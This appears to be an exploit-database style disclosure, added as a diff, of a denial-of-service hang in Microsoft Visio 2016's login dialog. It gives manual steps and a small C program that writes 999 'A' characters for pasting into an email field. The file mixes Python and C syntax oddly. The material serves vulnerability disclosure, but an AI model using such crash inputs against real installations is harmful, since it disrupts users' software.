@@ -1,0 +1,39 @@
+﻿# -⋆- coding: utf-8 -⋆-
+Created on Thu Feb 21 01:32:50 2019
+
+@author: César
+"""
+
+#Exploit Title: Microsoft Visio 2016 (16.0.4738.1000) "Log in accounts" allows go on whit email formed by one thousand A in every of its parts AAA---A@AAA--A.AAA---A 
+#Descovered by: César Adrián Coronado Llanos
+#Descovered Date; Sun Feb 17 20:34:23 2019
+#Vendor Homepage: https://www.microsoft.com
+#Tested Version: 16.0.4738.1000 x64
+#Tested on OS: Microsoft Windows 10 Home Single Language x64
+#Versión 		10.0.10240 compilación 10240
+
+#Steps to produce the crash
+#1.- Run c code: generator.c
+#2.- Open the file created "letters.txt" and copy the text content to clipboard
+#3.- Open Visio 2016
+#4.- Click in change account or Login
+#5.- In the Login paste the clipboard, typewrite @ paste again the clipboard, typewrite . and paste for last time the clipboard, clik in next
+#6.- Click in professional account
+#7.- Visio 2016 don't respond, however it stays in a white window and don't send us any message
+
+Note: For do this you need internet conection.
+
+#include<stdio.h>
+int main(){
+	int i;
+	FILE *letters;
+	if((letters = fopen("letters.txt","w+")) != NULL){
+		for(i=0;i<999;i++){
+			fprintf(letters,"A");
+		}
+	}
+	fclose(letters);
+	printf("\tThe file was created successfully!!\n");
+}
+
+Note: This code was compiled in dev C++
